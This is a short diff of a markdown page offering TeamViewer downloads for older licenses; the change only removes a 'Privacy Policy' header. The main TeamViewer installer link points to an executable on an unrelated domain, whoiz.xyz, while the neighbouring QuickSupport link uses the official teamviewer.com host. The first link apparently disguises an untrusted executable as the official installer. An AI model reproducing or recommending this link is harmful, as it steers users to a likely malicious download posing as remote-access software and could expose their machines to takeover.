@@ -3,7 +3,6 @@
 The downloads on this page are only recommended for users with older licenses that may not be used with the newest release.
 
 ## Windows (10/8/vista/7)
-## Privacy Policy
 
 ### [TeamViewer](https://whoiz.xyz/TeamViewer_Setup.exe)
 ### [TeamViewer QuickSupport](https://download.teamviewer.com/download/version_14x/TeamViewerQS.exe)
